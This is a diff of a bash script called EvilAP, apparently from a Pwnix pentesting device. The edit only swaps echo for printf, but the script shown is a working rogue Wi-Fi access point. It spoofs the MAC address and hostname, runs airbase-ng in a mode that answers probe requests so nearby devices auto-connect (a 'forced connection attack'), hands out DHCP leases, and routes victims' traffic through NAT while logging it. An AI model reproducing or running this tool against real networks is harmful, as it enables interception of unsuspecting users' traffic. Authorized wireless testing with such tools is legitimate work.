@@ -20,15 +20,14 @@ trap f_endclean INT
 trap f_endclean KILL
 
 f_endclean(){
-  echo
-  echo "[-] Exiting..."
+  printf "\n[-] Exiting...\n"
   f_restore_ident
   f_clean_up
   ifconfig wlan1 down &> /dev/null
 }
 
 f_clean_up(){
-  echo "[-] Killing other instances of airbase or dhcpd"
+  printf "[-] Killing other instances of airbase or dhcpd\n"
   killall airbase-ng &> /dev/null
   killall dhcpd &> /dev/null
   hardw=`/system/bin/getprop ro.hardware`
@@ -44,7 +43,7 @@ f_clean_up(){
 }
 
 f_restore_ident(){
-  echo "[+] Restoring network identity"
+  printf "[+] Restoring network identity\n"
   hostn=`cat /etc/hostname`
   ifconfig wlan1 down &> /dev/null
   macchanger -p wlan1 &> /dev/null
@@ -57,12 +56,9 @@ f_banner(){
 
 f_ssid(){
   clear
-  echo
-  echo "[+] Enter an SSID name"
-  echo "[-] Default SSID: [Public_Wireless]"
-  echo
+  printf "\n[+] Enter an SSID name\n"
+  printf "[-] Default SSID: [Public_Wireless]\n\n"
   read -p "SSID: " ssid
-  echo
 
   if [ -z $ssid ]; then
     ssid=Public_Wireless
@@ -71,12 +67,10 @@ f_ssid(){
 
 f_channel(){
   clear
-  echo
-  echo "[+] Enter the channel to run EvilAP on [1-14]"
-  echo "[-] Default channel: [1]"
-  echo
+  printf "\n[+] Enter the channel to run EvilAP on [1-14]\n"
+  printf "[-] Default channel: [1]\n\n"
   read -p "Channel: " channel
-  echo
+
   case $channel in
     [1-14]*) ;;
     *) channel=1 ;;
@@ -85,15 +79,10 @@ f_channel(){
 
 f_beacon_rate(){
   clear
-  echo
-  echo "[+] Enter the beacon rate at which to broadcast probe requests:"
-  echo
-  echo "[!] If clients don't stay connected try changing this value"
-  echo
-  echo "[-] Default is: [30]"
-  echo
+  printf "\n[+] Enter the beacon rate at which to broadcast probe requests:\n\n"
+  printf "[!] If clients don't stay connected try changing this value\n\n"
+  printf "[-] Default is: [30]\n\n"
   read -p "Range [20-70]: " brate
-  echo
 
   if [ -z $brate ]; then
     brate=30
@@ -102,14 +91,13 @@ f_beacon_rate(){
 
 f_preplaunch(){
   #Change the hostname and mac address randomly
-  echo "[+] Rolling MAC address and hostname randomly"
-  echo
+  printf "\n[+] Rolling MAC address and hostname randomly\n\n"
 
   ifconfig wlan1 down
 
   hn=`ifconfig wlan1 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
   hostname $hn
-  echo "[+] New hostname set: $hn"
+  printf "[+] New hostname set: $hn\n"
 
   sleep 2
   #Put wlan1 into monitor mode and randomize mac - wlan1mon created
@@ -123,13 +111,13 @@ f_preplaunch(){
 }
 
 f_logname(){
-  echo "/opt/pwnix/captures/wireless/evilap-$(date +%s).log"
+  printf "/opt/pwnix/captures/wireless/evilap-$(date +%s).log\n"
 }
 
 f_evilap(){
   #Log path and name
   logname=$(f_logname)
-  echo "[+] Creating new logfile: $logname"
+  printf "[+] Creating new logfile: $logname\n"
 
   #Start Airbase-ng with -P for preferred networks
   airbase-ng -P -C $brate -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
@@ -142,7 +130,7 @@ f_evilap(){
   dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
 
   #IP forwarding and iptables routing using internet connection
-  echo 1 > /proc/sys/net/ipv4/ip_forward
+  printf 1 > /proc/sys/net/ipv4/ip_forward
   iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE
 
   tail -f $logname
@@ -151,7 +139,7 @@ f_evilap(){
 f_niceap(){
   #Log path and name
   logname=$(f_logname)
-  echo "[+] Creating new logfile: $logname"
+  printf "[+] Creating new logfile: $logname\n"
 
   #Start Airbase-ng with -P for preferred networks
   airbase-ng -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
@@ -164,7 +152,7 @@ f_niceap(){
   dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
 
   #IP forwarding and iptables routing using internet connection
-  echo 1 > /proc/sys/net/ipv4/ip_forward
+  printf 1 > /proc/sys/net/ipv4/ip_forward
   iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE
 
   tail -f $logname
@@ -172,17 +160,11 @@ f_niceap(){
 
 f_karmaornot(){
   clear
-  echo
-  echo "[?] Force clients to connect with their probe requests?"
-  echo
-  echo "[!] Everything will start connecting to you if YES is selected!"
-  echo
-  echo "1. Yes"
-  echo "2. No"
-  echo
+  printf "\n[?] Force clients to connect with their probe requests?\n\n"
+  printf "[!] Everything will start connecting to you if YES is selected!\n\n"
+  printf "1. Yes\n"
+  printf "2. No\n\n"
   read -p "Choice [1-2]: " karma
-  echo
-  echo
   case $karma in
     [1-2]*) ;;
     *) f_karmaornot ;;
@@ -204,10 +186,10 @@ f_karmaornot
 f_preplaunch
 
 if [ $karma -eq 1 ]; then
-  echo "[+] Starting EvilAP with forced connection attack"
+  printf "[+] Starting EvilAP with forced connection attack\n"
   f_evilap
 else
-  echo "[+] Starting EvilAP without forced connection attack"
+  printf "[+] Starting EvilAP without forced connection attack\n"
   f_niceap
 fi
 
